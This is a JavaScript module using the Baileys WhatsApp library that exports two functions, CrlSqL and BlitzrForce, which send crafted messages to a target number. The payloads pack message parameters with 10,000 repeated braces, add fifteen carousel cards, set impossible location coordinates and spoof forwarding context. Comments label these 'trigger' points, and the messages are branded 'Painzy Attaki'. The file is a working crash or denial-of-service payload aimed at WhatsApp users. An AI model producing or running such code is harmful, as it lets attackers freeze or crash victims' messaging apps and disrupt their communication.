const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const ImgCrL = fs.readFileSync('./ImgCrL.jpg')

async function CrlSqL(client, target, fjids) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./console/media/song.mp4") },
    { upload: client.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "PzY-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰𝐓͈𝐚𝐦͢𝐚 𝐂𝐨𝐧ͯ͢𝐜𝐮͢𝐞𝐫𝐫𝐨𝐫ཀ͜͡🪅",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Painzy Attaki",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://painzy.web.id",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𒑡 𝐏𝐳𝐘 ᭧ 𖤂𝐭𝐭𖤂𝐤𝐢᭾៚"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "PzY" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Painzy Engine",
                body: "",
                thumbnailUrl: "https://files.catbox.moe/6og6hv.jpg",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://painzy.web.id",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await client.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function BlitzrForce(client, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𒑡 𝐏𝐳𝐘 ᭧ 𖤂𝐭𝐭𖤂𝐤𝐢᭾៚",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.0349999999999,
                degreesLongitude: 922.999999999999,
                name: "𒑡 𝐏𝐳𝐘 ᭧ 𖤂𝐭𝐭𖤂𝐤𝐢᭾៚",
                address: "𒑡 𝐏𝐳𝐘 ᭧ 𖤂𝐭𝐭𖤂𝐤𝐢᭾៚",
              },
            },
            body: {
              text: "𒑡 𝐏𝐳𝐘 ᭧ 𖤂𝐭𝐭𖤂𝐤𝐢᭾៚",
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await client.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

module.exports = { BlitzrForce, CrlSqL }
